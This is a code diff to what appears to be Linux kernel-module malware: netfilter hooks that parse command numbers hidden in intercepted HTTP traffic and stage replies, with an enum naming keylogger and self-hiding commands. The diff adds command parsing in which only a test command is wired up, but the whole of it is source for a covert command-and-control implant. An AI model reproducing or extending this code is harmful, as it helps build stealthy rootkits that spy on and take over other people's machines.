@@ -8,13 +8,11 @@
 #include <linux/version.h>
 #include <net/ip.h>
 
+
 #include "cnc.h"
 
 
 #define MALWARE_FUNC "colman-function"
-
-#define MALWARE_RESULT "Content-Encoding"
-#define MALWARE_RESULT_FIND "Content-Encoding"
 
 void * find_malware_struct(void * address, char * string);
 
@@ -26,16 +24,11 @@ unsigned int http_callback( unsigned int hooknum, struct sk_buff *pskb, const st
 void set_result_msg(char * result_msg, size_t msg_len);
 
 typedef enum {
-	KEYLOGGER = 0,
+	TEST = 0,
 	SELF_HIDE,
-	TEST
+	KEYLOGGER
 }COMMANDS;
 
-
-struct cnc_http_magic {
-	unsigned int magic;
-	COMMANDS comm;
-};
 
 
 #define MAX_HTTP_HEADER_LEN 2048
@@ -71,6 +64,7 @@ void set_result_msg(char * result_msg, size_t msg_len)
 	global_result_msg->len = msg_len;
 	memcpy(global_result_msg->msg, result_msg, msg_len);
 }
+
 unsigned int http_callback_result( unsigned int hooknum, struct sk_buff *pskb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *) )
 {
 	struct ethhdr *ethh = NULL;
@@ -82,7 +76,6 @@ unsigned int http_callback_result( unsigned int hooknum, struct sk_buff *pskb, c
 	unsigned char *tcp_data = NULL;
 	char * tcp_new_data;
 	int offset = 0, len = 0;
-	char result_string[MAX_RESULT_LEN];
   	char result_header[] = RESULT_HEADER_STR;
   	char result_header_end[] = "\r\n";
   	char* ptr;
@@ -180,6 +173,7 @@ unsigned int http_callback_get_command( unsigned int hooknum, struct sk_buff *ps
 	unsigned char *tcp_data = NULL;
 	char command[MAX_COMMAND_LEN];
 	int i = 0, index = 0;
+	long command_num = 1;
 
 	iph = ip_hdr(pskb);
 	if (NULL == iph) {
@@ -232,7 +226,27 @@ unsigned int http_callback_get_command( unsigned int hooknum, struct sk_buff *ps
 	}
 	command[i-2] = 0x0;
 
-	printk("command = %s\n", command);
+	//printk("command = %s (len %d)\n", command, i-2);
+
+	
+	//uintmax_t command_num = strtoumax(command, NULL, 10);
+	if (kstrtol(command, 10, &command_num) != 0)
+	{
+    	printk("[-] Invlid command.\n");
+		return NF_ACCEPT;
+	}
+
+	switch ((COMMANDS)command_num) {
+		case TEST :
+			set_result_msg("Test OK", strlen("Test OK"));
+			printk("OK\n");
+			break;
+
+		default:
+			set_result_msg("Invalid command", strlen("Invalid command"));
+			printk("Invalid command\n");
+			break;
+	}
 	return NF_ACCEPT;
 }
 
